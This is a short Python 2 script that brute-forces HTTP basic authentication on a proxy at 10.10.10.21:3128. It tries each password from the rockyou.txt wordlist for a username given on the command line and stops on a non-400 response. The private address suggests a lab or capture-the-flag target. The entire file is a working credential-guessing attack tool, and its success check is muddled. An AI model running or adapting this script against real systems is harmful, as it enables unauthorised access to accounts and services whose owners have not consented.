#!/usr/bin/python




import requests
import sys


def try_get_url_with_auth(url, user, passwd):
    session = requests.session()
    resp = session.get(url, auth=(user, passwd))
    return resp




#filename = '/usr/share/john/password.lst'
#filename = 'usr/share/dirb/wordlists/big.txt'
#filename = '/usr/share/wfuzz/wordlist/general/big.txt'
filename = '/usr/share/wordlists/rockyou.txt'
#filename = '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
#filename = '/usr/share/dirb/wordlists/common.txt'

url = "http://10.10.10.21:3128/"

username = sys.argv[1]

f = open(filename, 'r')  
for line in f.readlines():  
    pw = line.strip('\n')
    resp = try_get_url_with_auth(url, username, pw)
    print username+":"+pw+" => "+str(resp.status_code)
    if resp.status_code != 400:
        print('Yolo!')
        exit(0)
    if resp.status_code == 200:
        print('Success!')
        exit(0)


